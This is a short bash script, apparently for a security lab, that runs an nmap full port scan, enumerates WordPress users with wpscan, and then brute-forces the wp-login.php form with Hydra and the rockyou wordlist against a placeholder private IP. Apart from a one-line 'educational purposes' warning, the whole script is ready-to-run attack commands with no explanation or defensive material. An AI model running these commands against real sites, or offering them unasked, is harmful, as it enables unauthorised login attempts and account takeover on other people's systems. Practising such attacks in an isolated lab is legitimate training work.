#!/bin/bash
# Brute Force Attack Simulation Commands
# WARNING: For educational purposes in isolated lab only

TARGET_IP="192.168.56.101"  # Replace with your target IP
TARGET_URL="http://$TARGET_IP"

echo "[*] Starting Reconnaissance Phase..."

# Phase 1: Port Scanning
echo "[+] Running Nmap scan..."
nmap -p- -A -T4 $TARGET_IP -oN nmap_scan.txt

# Phase 2: Service Enumeration
echo "[+] Enumerating WordPress users..."
wpscan --url $TARGET_URL --enumerate u --no-banner -o wpscan_users.txt

# Phase 3: Brute Force Attack
echo "[+] Launching Hydra brute force attack..."
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET_IP http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" \
  -t 16 -V -o hydra_results.txt

echo "[*] Attack simulation complete. Check output files for results."
